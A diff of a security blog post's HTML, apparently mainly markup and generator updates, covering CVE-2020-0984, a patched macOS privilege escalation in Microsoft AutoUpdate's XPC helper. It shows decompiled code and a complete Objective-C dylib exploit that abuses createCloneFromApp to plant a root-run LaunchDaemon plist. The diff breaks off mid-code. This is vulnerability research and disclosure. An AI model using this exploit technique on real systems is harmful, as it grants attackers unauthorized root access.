@@ -54,7 +54,7 @@
     <link rel="icon" type="image/png" href="https://theevilbit.github.io/images/favicon-32x32.png" sizes="32x32">
     <link rel="icon" type="image/png" href="https://theevilbit.github.io/images/favicon-16x16.png" sizes="16x16">
 
-    <meta name="generator" content="Hugo 0.92.1" />
+    <meta name="generator" content="Hugo 0.96.0" />
   </head>
 
   <body class=" ">
@@ -153,7 +153,7 @@
 <p>Microsoft uses a privileged helper tool to update MS Office applications on macOS, called Microsoft AutoUpdate (MSAU). Privileged helper tools run as root, and these services are typically installed to perform specific tasks for the client application that would require privilege elevation otherwise. Since the introduction of XPC, these tools mostly utilize XPC as an IPC (Inter Process Communication). Almost 2 years ago <a href="https://twitter.com/CodeColorist">(@CodeColorist)</a> already found a local privilege escalation in this software which was a weakness in its XPC connection verification and one of the offered functions, here is the link to his writeup: <a href="https://medium.com/0xcc/cve-2018-8412-ms-office-2016-for-mac-privilege-escalation-via-a-legcy-package-7fccdbf71d9b">CVE-2018–8412: MS Office 2016 for Mac Privilege Escalation via a Legacy Package</a>. Although Microsoft patched the vulnerable XPC function <code>installUpdateWithPackage</code>, they introduced new functionality in later versions, and as the client verification still wasn&rsquo;t fixed properly it introduced a new local privilege escalation vulnerability. This was patched by Microsoft at the 15th of April 2020, and assigned <a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0984">CVE-2020-0984</a>. Unfortunately this is common theme that vendors don&rsquo;t fix XPC vulnerabilities properly, and many time we can re-exploit them.</p>
 <h2 id="cve-2020-0984-exploitation">CVE-2020-0984 exploitation</h2>
 <p>When the MSAU privileged helper tool accepts a connection from a connecting client, it will perform the following signature check against it in its <code>shouldAcceptNewConnection</code> function:</p>
-<pre tabindex="0"><code>&quot;(identifier \&quot;com.microsoft.autoupdate2\&quot; or identifier \&quot;com.microsoft.autoupdate.fba\&quot; or identifier \&quot;com.microsoft.autoupdate.cli\&quot;) and anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] and certificate leaf[field.1.2.840.113635.100.6.1.&quot; and certificate leaf[subject.OU] = UBF8T346G9
+<pre tabindex="0"><code>&#34;(identifier \&#34;com.microsoft.autoupdate2\&#34; or identifier \&#34;com.microsoft.autoupdate.fba\&#34; or identifier \&#34;com.microsoft.autoupdate.cli\&#34;) and anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] and certificate leaf[field.1.2.840.113635.100.6.1.&#34; and certificate leaf[subject.OU] = UBF8T346G9
 </code></pre><p>This will check if:</p>
 <ol>
 <li>The connecting process is signed by Apple</li>
@@ -185,127 +185,127 @@ Sealed Resources version=2 rules=13 files=307
 Internal requirements count=1 size=188
 </code></pre><p>We can see that it has one of the bundle IDs we need <code>com.microsoft.autoupdate2</code> and also the same team ID the verification expects, <code>UBF8T346G9</code>.</p>
 <p>Now that we can talk to the helper tool, with some reverse engineering we can check if it has any promising function. Running <code>class-dump</code> against the binary <code>/Library/PrivilegedHelperTools/com.microsoft.autoupdate.helper</code> reveals that its functionality has been extended since 2018, it has more interfaces available through XPC. The <code>MAUHelperToolProtocol</code> describe the available functions we can call.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-objectivec" data-lang="objectivec"><span style="color:#069;font-weight:bold">@protocol</span> <span style="color:#0a8;font-weight:bold">MAUHelperToolProtocol</span> <span style="color:#555">&lt;</span>NSObject<span style="color:#555">&gt;</span>
-<span style="color:#555">-</span> (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#99f">removeInstallLogFile</span>:(NSString <span style="color:#555">*</span>)arg1;
-- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">logString:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">atLevel:</span>(<span style="color:#078;font-weight:bold">int</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">fromAppName:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg3</span>;
-- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">removeClone:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">withReply:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(NSString <span style="color:#555">*</span>))<span style="color:#033">arg2</span>;
-- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">restoreCloneToAppInstallLocation:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">withClonePath:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">withReply:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(NSString <span style="color:#555">*</span>))<span style="color:#033">arg3</span>;
-- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">createCloneFromApp:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">withClonePath:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">withReply:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(NSString <span style="color:#555">*</span>))<span style="color:#033">arg3</span>;
-- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">installUpdateWithPackage:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">withXMLPath:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">withAppPath:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg3</span> <span style="color:#c0f">withClonePath:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg4</span> <span style="color:#c0f">withReply:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(NSString <span style="color:#555">*</span>))<span style="color:#033">arg5</span>;
-<span style="color:#069;font-weight:bold">@end</span>
-</code></pre></div><p>The <code>createCloneFromApp</code> sounded interesting, if we take a closer look, we will see that it simply copies the file passed into the location given without any further checks, and it uses the <code>[NSFileManager copyItemAtPath]</code> for this. We can use Hopper to decompile the function.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-objectivec" data-lang="objectivec">-(<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">createCloneFromApp:</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">withClonePath:</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>)<span style="color:#033">arg3</span> <span style="color:#c0f">withReply:</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>)<span style="color:#033">arg4</span> {
-    var_48 <span style="color:#555">=</span> [arg2 <span style="color:#069;font-weight:bold">retain</span>];
-    r12 <span style="color:#555">=</span> [arg3 <span style="color:#069;font-weight:bold">retain</span>];
-    rax <span style="color:#555">=</span> [arg4 <span style="color:#069;font-weight:bold">retain</span>];
-    var_58 <span style="color:#555">=</span> r12;
-    var_40 <span style="color:#555">=</span> rax;
-    [<span style="color:#366">self</span> <span style="color:#99f">setErrorString</span>:<span style="color:#f60">0x0</span>];
-    rax <span style="color:#555">=</span> [NSString <span style="color:#99f">stringWithFormat</span>:<span style="color:#c30">@&#34;createCloneFromApp appPath: %@, clonePath: %@&#34;</span>, var_48, r12];
-    rax <span style="color:#555">=</span> [rax <span style="color:#069;font-weight:bold">retain</span>];
-    var_60 <span style="color:#555">=</span> rax;
-    [<span style="color:#366">self</span> <span style="color:#99f">logString</span>:rax <span style="color:#99f">atLevel</span>:<span style="color:#f60">0x5</span> <span style="color:#99f">fromAppName</span>:<span style="color:#c30">@&#34;Helper Tool&#34;</span>];
-    rax <span style="color:#555">=</span> [var_48 lastPathComponent];
-    rax <span style="color:#555">=</span> [rax <span style="color:#069;font-weight:bold">retain</span>];
-    r12 <span style="color:#555">=</span> [[var_58 <span style="color:#99f">stringByAppendingPathComponent</span>:rax] <span style="color:#069;font-weight:bold">retain</span>];
-    [rax <span style="color:#069;font-weight:bold">release</span>];
-    var_50 <span style="color:#555">=</span> r12;
-    r8 <span style="color:#555">=</span> r12;
-    rax <span style="color:#555">=</span> [NSString <span style="color:#99f">stringWithFormat</span>:<span style="color:#c30">@&#34;Performing copyItemAtPath: %@ toPath: %@&#34;</span>, var_48, r8];
-    r12 <span style="color:#555">=</span> var_48;
-    rax <span style="color:#555">=</span> [rax <span style="color:#069;font-weight:bold">retain</span>];
-    var_38 <span style="color:#555">=</span> <span style="color:#366">self</span>;
-    [<span style="color:#366">self</span> <span style="color:#99f">logString</span>:rax <span style="color:#99f">atLevel</span>:<span style="color:#f60">0x5</span> <span style="color:#99f">fromAppName</span>:<span style="color:#c30">@&#34;Helper Tool&#34;</span>];
-    [rax <span style="color:#069;font-weight:bold">release</span>];
-    r14 <span style="color:#555">=</span> var_40;
-    rax <span style="color:#555">=</span> [NSFileManager defaultManager];
-    rax <span style="color:#555">=</span> [rax <span style="color:#069;font-weight:bold">retain</span>];
-    r13 <span style="color:#555">=</span> rax;
-    [rax <span style="color:#99f">removeItemAtPath</span>:var_50 <span style="color:#99f">error</span>:<span style="color:#f60">0x0</span>];
-    var_78 <span style="color:#555">=</span> <span style="color:#f60">0x0</span>;
-    rbx <span style="color:#555">=</span> [r13 <span style="color:#99f">copyItemAtPath</span>:r12 <span style="color:#99f">toPath</span>:var_50 <span style="color:#99f">error</span>:r8];
-    r15 <span style="color:#555">=</span> [var_78 <span style="color:#069;font-weight:bold">retain</span>];
-</code></pre></div><p>If we can copy a file as root, with a source and destination we control, it&rsquo;s a trivial privilege escalation on macOS (and normally also on any other OS as well). Our plan will be to copy a <code>PLIST</code> file into <code>/Library/LaunchDaemons</code>, which will contain a command to run a script upon startup. Any script/application run from this directory will run as <code>root</code>. Our exploit is a short NSXPC client code, that will invoke the <code>createCloneFromApp</code> method of the XPC service. As it&rsquo;s a dylib, the code is placed into the constructor. The exploit will create a PLIST file in the location we need, and include a short shell script to create a file at <code>/Library/msauexp.txt</code>, where only root has write access.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-objectivec" data-lang="objectivec"><span style="color:#099">#import &lt;Foundation/Foundation.h&gt;
-</span><span style="color:#099"></span>
-<span style="color:#069;font-weight:bold">static</span> NSString<span style="color:#555">*</span> kXPCHelperMachServiceName <span style="color:#555">=</span> <span style="color:#c30">@&#34;com.microsoft.autoupdate.helper&#34;</span>;
-
-<span style="color:#09f;font-style:italic">// The protocol that MSAU will vend as its XPC API.
-</span><span style="color:#09f;font-style:italic"></span><span style="color:#069;font-weight:bold">@protocol</span> <span style="color:#0a8;font-weight:bold">MAUHelperToolProtocol</span> <span style="color:#555">&lt;</span>NSObject<span style="color:#555">&gt;</span>
-<span style="color:#555">-</span> (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#99f">removeInstallLogFile</span>:(NSString <span style="color:#555">*</span>)arg1;
-- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">logString:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">atLevel:</span>(<span style="color:#078;font-weight:bold">int</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">fromAppName:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg3</span>;
-- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">removeClone:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">withReply:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(NSString <span style="color:#555">*</span>))<span style="color:#033">arg2</span>;
-- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">restoreCloneToAppInstallLocation:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">withClonePath:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">withReply:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(NSString <span style="color:#555">*</span>))<span style="color:#033">arg3</span>;
-- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">createCloneFromApp:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">withClonePath:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">withReply:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(NSString <span style="color:#555">*</span>))<span style="color:#033">arg3</span>;
-- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">installUpdateWithPackage:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">withXMLPath:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">withAppPath:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg3</span> <span style="color:#c0f">withClonePath:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg4</span> <span style="color:#c0f">withReply:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(NSString <span style="color:#555">*</span>))<span style="color:#033">arg5</span>;
-<span style="color:#069;font-weight:bold">@end</span>
-
-__attribute__((constructor))
-<span style="color:#069;font-weight:bold">static</span> <span style="color:#078;font-weight:bold">void</span> customConstructor(<span style="color:#078;font-weight:bold">int</span> argc, <span style="color:#069;font-weight:bold">const</span> <span style="color:#078;font-weight:bold">char</span> <span style="color:#555">**</span>argv)
-{
-        
-		NSString<span style="color:#555">*</span> my_plist <span style="color:#555">=</span> <span style="color:#c30">@&#34;&lt;?xml version=</span><span style="color:#c30;font-weight:bold">\&#34;</span><span style="color:#c30">1.0</span><span style="color:#c30;font-weight:bold">\&#34;</span><span style="color:#c30"> encoding=</span><span style="color:#c30;font-weight:bold">\&#34;</span><span style="color:#c30">UTF-8</span><span style="color:#c30;font-weight:bold">\&#34;</span><span style="color:#c30">?&gt;&#34;</span>
-		<span style="color:#c30">&#34;&lt;!DOCTYPE plist PUBLIC </span><span style="color:#c30;font-weight:bold">\&#34;</span><span style="color:#c30">-//Apple Computer//DTD PLIST 1.0//EN</span><span style="color:#c30;font-weight:bold">\&#34;</span><span style="color:#c30"> </span><span style="color:#c30;font-weight:bold">\&#34;</span><span style="color:#c30">http://www.apple.com/DTDs/PropertyList-1.0.dtd</span><span style="color:#c30;font-weight:bold">\&#34;</span><span style="color:#c30">&gt;&#34;</span>
-		<span style="color:#c30">&#34;&lt;plist version=</span><span style="color:#c30;font-weight:bold">\&#34;</span><span style="color:#c30">1.0</span><span style="color:#c30;font-weight:bold">\&#34;</span><span style="color:#c30">&gt;&#34;</span>
-		<span style="color:#c30">&#34;&lt;dict&gt;&#34;</span>
-		<span style="color:#c30">&#34;  &lt;key&gt;Label&lt;/key&gt;&#34;</span>
-		<span style="color:#c30">&#34;  &lt;string&gt;com.sample.Load&lt;/string&gt;&#34;</span>
-		<span style="color:#c30">&#34;  &lt;key&gt;ProgramArguments&lt;/key&gt;&#34;</span>
-		<span style="color:#c30">&#34;  &lt;array&gt;&#34;</span>
-		<span style="color:#c30">&#34;	   &lt;string&gt;/bin/zsh&lt;/string&gt;&#34;</span>
-      <span style="color:#c30">&#34;      &lt;string&gt;-c&lt;/string&gt;&#34;</span>
-      <span style="color:#c30">&#34;      &lt;string&gt;touch /Library/msauexp.txt&lt;/string&gt;&#34;</span>
-		<span style="color:#c30">&#34;  &lt;/array&gt;&#34;</span>
-		<span style="color:#c30">&#34;	 &lt;key&gt;RunAtLoad&lt;/key&gt;&#34;</span>
-		<span style="color:#c30">&#34;	 &lt;true/&gt;&#34;</span>
-		<span style="color:#c30">&#34;&lt;/dict&gt;&#34;</span>
-		<span style="color:#c30">&#34;&lt;/plist&gt;&#34;</span>;
-		
-        [my_plist <span style="color:#99f">writeToFile</span>:<span style="color:#c30">@&#34;/tmp/com.sample.Load.plist&#34;</span> <span style="color:#99f">atomically</span>:<span style="color:#366">YES</span> <span style="color:#99f">encoding</span>:NSASCIIStringEncoding <span style="color:#99f">error</span>:<span style="color:#366">nil</span>];
-		
-        NSString<span style="color:#555">*</span>  _serviceName <span style="color:#555">=</span> kXPCHelperMachServiceName;
-
-        NSXPCConnection<span style="color:#555">*</span> _agentConnection <span style="color:#555">=</span> [[NSXPCConnection alloc] <span style="color:#99f">initWithMachServiceName</span>:_serviceName <span style="color:#99f">options</span>:<span style="color:#f60">4096</span>];
-        [_agentConnection <span style="color:#99f">setRemoteObjectInterface</span>:[NSXPCInterface <span style="color:#99f">interfaceWithProtocol</span>:@protocol(MAUHelperToolProtocol)]];
-        [_agentConnection resume];
-
-        <span style="color:#09f;font-style:italic">//        run user script as root/
-</span><span style="color:#09f;font-style:italic"></span>        [[_agentConnection <span style="color:#99f">remoteObjectProxyWithErrorHandler</span>:<span style="color:#555">^</span>(NSError<span style="color:#555">*</span> error) {
-            (<span style="color:#078;font-weight:bold">void</span>)error;
-            NSLog(<span style="color:#c30">@&#34;Connection Failure&#34;</span>);
-        }] <span style="color:#99f">createCloneFromApp</span>:<span style="color:#c30">@&#34;/tmp/com.sample.Load.plist&#34;</span> <span style="color:#99f">withClonePath</span>:<span style="color:#c30">@&#34;/Library/LaunchDaemons/&#34;</span> <span style="color:#99f">withReply</span>:<span style="color:#555">^</span>(NSString <span style="color:#555">*</span> err){
-            NSLog(<span style="color:#c30">@&#34;Reply, %@&#34;</span>, err);
-        }];
-        NSLog(<span style="color:#c30">@&#34;Done!&#34;</span>);
-
-    <span style="color:#069;font-weight:bold">return</span>;
-}
-</code></pre></div><p>Compile:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-objectivec" data-lang="objectivec"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">@protocol</span> <span style="color:#0a8;font-weight:bold">MAUHelperToolProtocol</span> <span style="color:#555">&lt;</span>NSObject<span style="color:#555">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#555">-</span> (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#99f">removeInstallLogFile</span>:(NSString <span style="color:#555">*</span>)arg1;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">logString:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">atLevel:</span>(<span style="color:#078;font-weight:bold">int</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">fromAppName:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg3</span>;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">removeClone:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">withReply:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(NSString <span style="color:#555">*</span>))<span style="color:#033">arg2</span>;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">restoreCloneToAppInstallLocation:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">withClonePath:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">withReply:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(NSString <span style="color:#555">*</span>))<span style="color:#033">arg3</span>;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">createCloneFromApp:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">withClonePath:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">withReply:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(NSString <span style="color:#555">*</span>))<span style="color:#033">arg3</span>;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">installUpdateWithPackage:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">withXMLPath:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">withAppPath:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg3</span> <span style="color:#c0f">withClonePath:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg4</span> <span style="color:#c0f">withReply:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(NSString <span style="color:#555">*</span>))<span style="color:#033">arg5</span>;
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">@end</span>
+</span></span></code></pre></div><p>The <code>createCloneFromApp</code> sounded interesting, if we take a closer look, we will see that it simply copies the file passed into the location given without any further checks, and it uses the <code>[NSFileManager copyItemAtPath]</code> for this. We can use Hopper to decompile the function.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-objectivec" data-lang="objectivec"><span style="display:flex;"><span>-(<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">createCloneFromApp:</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">withClonePath:</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>)<span style="color:#033">arg3</span> <span style="color:#c0f">withReply:</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>)<span style="color:#033">arg4</span> {
+</span></span><span style="display:flex;"><span>    var_48 <span style="color:#555">=</span> [arg2 <span style="color:#069;font-weight:bold">retain</span>];
+</span></span><span style="display:flex;"><span>    r12 <span style="color:#555">=</span> [arg3 <span style="color:#069;font-weight:bold">retain</span>];
+</span></span><span style="display:flex;"><span>    rax <span style="color:#555">=</span> [arg4 <span style="color:#069;font-weight:bold">retain</span>];
+</span></span><span style="display:flex;"><span>    var_58 <span style="color:#555">=</span> r12;
+</span></span><span style="display:flex;"><span>    var_40 <span style="color:#555">=</span> rax;
+</span></span><span style="display:flex;"><span>    [<span style="color:#366">self</span> <span style="color:#99f">setErrorString</span>:<span style="color:#f60">0x0</span>];
+</span></span><span style="display:flex;"><span>    rax <span style="color:#555">=</span> [NSString <span style="color:#99f">stringWithFormat</span>:<span style="color:#c30">@&#34;createCloneFromApp appPath: %@, clonePath: %@&#34;</span>, var_48, r12];
+</span></span><span style="display:flex;"><span>    rax <span style="color:#555">=</span> [rax <span style="color:#069;font-weight:bold">retain</span>];
+</span></span><span style="display:flex;"><span>    var_60 <span style="color:#555">=</span> rax;
+</span></span><span style="display:flex;"><span>    [<span style="color:#366">self</span> <span style="color:#99f">logString</span>:rax <span style="color:#99f">atLevel</span>:<span style="color:#f60">0x5</span> <span style="color:#99f">fromAppName</span>:<span style="color:#c30">@&#34;Helper Tool&#34;</span>];
+</span></span><span style="display:flex;"><span>    rax <span style="color:#555">=</span> [var_48 lastPathComponent];
+</span></span><span style="display:flex;"><span>    rax <span style="color:#555">=</span> [rax <span style="color:#069;font-weight:bold">retain</span>];
+</span></span><span style="display:flex;"><span>    r12 <span style="color:#555">=</span> [[var_58 <span style="color:#99f">stringByAppendingPathComponent</span>:rax] <span style="color:#069;font-weight:bold">retain</span>];
+</span></span><span style="display:flex;"><span>    [rax <span style="color:#069;font-weight:bold">release</span>];
+</span></span><span style="display:flex;"><span>    var_50 <span style="color:#555">=</span> r12;
+</span></span><span style="display:flex;"><span>    r8 <span style="color:#555">=</span> r12;
+</span></span><span style="display:flex;"><span>    rax <span style="color:#555">=</span> [NSString <span style="color:#99f">stringWithFormat</span>:<span style="color:#c30">@&#34;Performing copyItemAtPath: %@ toPath: %@&#34;</span>, var_48, r8];
+</span></span><span style="display:flex;"><span>    r12 <span style="color:#555">=</span> var_48;
+</span></span><span style="display:flex;"><span>    rax <span style="color:#555">=</span> [rax <span style="color:#069;font-weight:bold">retain</span>];
+</span></span><span style="display:flex;"><span>    var_38 <span style="color:#555">=</span> <span style="color:#366">self</span>;
+</span></span><span style="display:flex;"><span>    [<span style="color:#366">self</span> <span style="color:#99f">logString</span>:rax <span style="color:#99f">atLevel</span>:<span style="color:#f60">0x5</span> <span style="color:#99f">fromAppName</span>:<span style="color:#c30">@&#34;Helper Tool&#34;</span>];
+</span></span><span style="display:flex;"><span>    [rax <span style="color:#069;font-weight:bold">release</span>];
+</span></span><span style="display:flex;"><span>    r14 <span style="color:#555">=</span> var_40;
+</span></span><span style="display:flex;"><span>    rax <span style="color:#555">=</span> [NSFileManager defaultManager];
+</span></span><span style="display:flex;"><span>    rax <span style="color:#555">=</span> [rax <span style="color:#069;font-weight:bold">retain</span>];
+</span></span><span style="display:flex;"><span>    r13 <span style="color:#555">=</span> rax;
+</span></span><span style="display:flex;"><span>    [rax <span style="color:#99f">removeItemAtPath</span>:var_50 <span style="color:#99f">error</span>:<span style="color:#f60">0x0</span>];
+</span></span><span style="display:flex;"><span>    var_78 <span style="color:#555">=</span> <span style="color:#f60">0x0</span>;
+</span></span><span style="display:flex;"><span>    rbx <span style="color:#555">=</span> [r13 <span style="color:#99f">copyItemAtPath</span>:r12 <span style="color:#99f">toPath</span>:var_50 <span style="color:#99f">error</span>:r8];
+</span></span><span style="display:flex;"><span>    r15 <span style="color:#555">=</span> [var_78 <span style="color:#069;font-weight:bold">retain</span>];
+</span></span></code></pre></div><p>If we can copy a file as root, with a source and destination we control, it&rsquo;s a trivial privilege escalation on macOS (and normally also on any other OS as well). Our plan will be to copy a <code>PLIST</code> file into <code>/Library/LaunchDaemons</code>, which will contain a command to run a script upon startup. Any script/application run from this directory will run as <code>root</code>. Our exploit is a short NSXPC client code, that will invoke the <code>createCloneFromApp</code> method of the XPC service. As it&rsquo;s a dylib, the code is placed into the constructor. The exploit will create a PLIST file in the location we need, and include a short shell script to create a file at <code>/Library/msauexp.txt</code>, where only root has write access.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-objectivec" data-lang="objectivec"><span style="display:flex;"><span><span style="color:#099">#import &lt;Foundation/Foundation.h&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">static</span> NSString<span style="color:#555">*</span> kXPCHelperMachServiceName <span style="color:#555">=</span> <span style="color:#c30">@&#34;com.microsoft.autoupdate.helper&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// The protocol that MSAU will vend as its XPC API.
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span><span style="color:#069;font-weight:bold">@protocol</span> <span style="color:#0a8;font-weight:bold">MAUHelperToolProtocol</span> <span style="color:#555">&lt;</span>NSObject<span style="color:#555">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#555">-</span> (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#99f">removeInstallLogFile</span>:(NSString <span style="color:#555">*</span>)arg1;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">logString:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">atLevel:</span>(<span style="color:#078;font-weight:bold">int</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">fromAppName:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg3</span>;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">removeClone:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">withReply:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(NSString <span style="color:#555">*</span>))<span style="color:#033">arg2</span>;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">restoreCloneToAppInstallLocation:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">withClonePath:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">withReply:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(NSString <span style="color:#555">*</span>))<span style="color:#033">arg3</span>;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">createCloneFromApp:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">withClonePath:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">withReply:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(NSString <span style="color:#555">*</span>))<span style="color:#033">arg3</span>;
